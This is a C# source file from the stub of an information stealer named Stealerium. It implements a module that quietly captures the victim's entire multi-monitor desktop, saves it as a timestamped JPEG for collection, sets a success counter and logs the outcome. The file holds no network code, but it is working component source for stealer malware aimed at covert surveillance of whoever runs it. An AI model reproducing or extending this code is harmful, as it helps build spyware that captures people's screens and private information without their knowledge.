using System;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.System
{
    internal static class DesktopScreenshot
    {
        // Importing the necessary method to handle DPI scaling
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        public static void Make(string sSavePath)
        {
            try
            {
                // Ensure the process is DPI aware
                SetProcessDPIAware();

                // Get the bounds of the virtual screen, which includes all monitors
                var bounds = SystemInformation.VirtualScreen;

                // Check if the directory exists, if not, create it
                if (!Directory.Exists(sSavePath))
                {
                    Directory.CreateDirectory(sSavePath);
                }

                // Generate a unique file name in case of multiple screenshots
                string fileName = Path.Combine(sSavePath, $"Desktop_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");

                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        // Adjust starting points to capture the entire virtual screen
                        g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                    }

                    // Save the bitmap with proper format handling
                    bitmap.Save(fileName, ImageFormat.Jpeg);
                }

                // Mark the desktop screenshot as successful
                Counter.DesktopScreenshot = true;
                Logging.Log("DesktopScreenshot >> Screenshot successfully created at: " + fileName);
            }
            catch (ExternalException ex)
            {
                Logging.Log("DesktopScreenshot >> GDI+ error: Failed to save the screenshot. This could be due to invalid file path, permissions, or file being in use.\nError Details: " + ex.Message, false);
            }
            catch (UnauthorizedAccessException ex)
            {
                Logging.Log("DesktopScreenshot >> Access error: Permission denied while trying to save the screenshot. Ensure the application has the right permissions to save files.\nError Details: " + ex.Message, false);
            }
            catch (DirectoryNotFoundException ex)
            {
                Logging.Log("DesktopScreenshot >> Directory error: The specified directory path is invalid or does not exist.\nError Details: " + ex.Message, false);
            }
            catch (Exception ex)
            {
                Logging.Log("DesktopScreenshot >> Unknown error: An unexpected error occurred while creating the screenshot.\nError Details: " + ex.Message, false);
            }
        }
    }
}
